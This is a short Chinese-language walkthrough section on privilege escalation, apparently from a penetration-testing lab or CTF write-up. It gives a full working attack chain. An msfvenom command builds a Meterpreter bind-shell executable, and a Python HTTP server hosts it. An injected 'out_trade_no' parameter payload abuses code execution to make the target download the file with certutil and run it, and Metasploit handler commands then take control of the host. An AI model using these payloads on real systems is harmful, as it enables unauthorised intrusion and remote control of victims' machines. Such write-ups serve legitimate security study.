# 权限提升

尝试过先写一个webshell再用蚁剑直接连接上传，发现不太行，大概率存在杀软

直接本地开个web服务，把msf生成的木马上传上去，利用这里的代码执行直接运行exe上线msf

生成正向连接exe

msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell_x86.exe
1

开启一个python http服务

python3 -m http.server 80
1

在靶机上命令执行，下载这个exe

out_trade_no[0]=eq&out_trade_no[1]=certutil -urlcache -split -f  http://172.16.233.2/bind_shell_x86.exe 1.exe&out_trade_no[2]=system
1

运行这个exe

out_trade_no[0]=eq&out_trade_no[1]=1.exe&out_trade_no[2]=system
1

本地msf监听

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set rhost 192.168.1.11
set lport 4444
run
